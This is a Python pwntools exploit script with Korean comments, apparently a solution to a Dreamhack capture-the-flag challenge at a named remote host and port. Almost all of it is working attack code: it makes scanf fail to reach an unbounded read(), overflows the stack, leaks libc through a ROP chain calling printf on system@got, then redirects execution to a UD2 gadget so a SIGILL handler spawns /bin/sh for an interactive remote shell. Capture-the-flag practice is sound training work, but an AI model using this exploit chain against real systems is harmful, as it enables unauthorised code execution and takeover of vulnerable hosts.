#!/usr/bin/env python3
"""
remote-only exploit (offsets hard-coded for glibc 2.35-0ubuntu3.6)

전략
 1) scanf("%d") 에 빈 줄을 줘 변환 실패 → SIGSEGV 없이 read() 직행
 2) un-init v1 값이 큼 ⇒ read() 길이 충분 → 스택 오버플로
 3) ret 에 UD2(+ENDBR64) 가젯 주소를 덮어 SIGILL 유발
 4) SIGILL 핸들러가 system("/bin/sh") 실행 → 쉘 획득
"""

from pwn import *

# ───── (1) 공격 대상 서버 주소/포트 ────────────────────────────────
HOST = "host3.dreamhack.games"
PORT = 9199
# ─────────────────────────────────────────────────────────────────

BIN   = "./deploy/prob"                 # 로컬 바이너리 (offset 계산 불필요)
elf   = ELF(BIN, checksec=False)
context.binary = elf
context.os, context.arch = "linux", "amd64"

# glibc 2.35-0ubuntu3.6 고정 오프셋
SYSTEM_OFF = 0x050d60
BINSH_OFF  = 0x1d8698
UD2_OFF    = 0x001c772          # endbr64; ud2  (abort+0x1c)

BUF  = 256
SF   = BUF + 8
READ = 0x400                    # v1 값이 충분히 클 것이라고 가정

def leak_libc(io, pop_rdi, pop_rsi):
    """printf("%p\n", system@got) 로 libc base 계산"""
    io.recvuntil(b"Enter size:")
    io.sendline(b"AAA")         # scanf 실패 → read()

    sys_got = elf.got['system']
    fmt     = next(elf.search(b"%p\n\x00"))  # .rodata

    payload  = b'A'*SF
    payload += p64(pop_rdi) + p64(fmt)       # rdi=format
    payload += p64(pop_rsi) + p64(sys_got)   # rsi=system@got
    payload += p64(elf.plt['printf'])
    payload += p64(elf.sym['main'])          # 다시 시작
    io.send(payload.ljust(READ, b'\0'))

    leak = int(io.recvline().strip(b"\n"), 16)
    base = leak - SYSTEM_OFF
    log.success(f"system leak = {hex(leak)}")
    log.success(f"libc base   = {hex(base)}")
    return base

def sigill_trigger(io, libc_base):
    ud2_addr = libc_base + UD2_OFF
    io.recvuntil(b"Enter size:")
    io.sendline(b"AAA")                     # again scanf 실패

    payload  = b'B'*SF
    payload += p64(ud2_addr)                # ⇢ UD2 ⇒ SIGILL ⇒ system("/bin/sh")
    io.send(payload.ljust(READ, b'\0'))

def main():
    io = remote(HOST, PORT)

    # PIE 이므로 가젯 주소 = 모듈 베이스 + 오프셋
    base   = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\0')) & ~0xfff
    elf.address = base                      # lazy leak from libc-start-main RET

    pop_rdi = base + ROP(elf).find_gadget(['pop rdi','ret'])[0]
    pop_rsi = base + ROP(elf).find_gadget(['pop rsi','ret'])[0]

    libc_base = leak_libc(io, pop_rdi, pop_rsi)
    sigill_trigger(io, libc_base)

    io.interactive()

if __name__ == "__main__":
    main()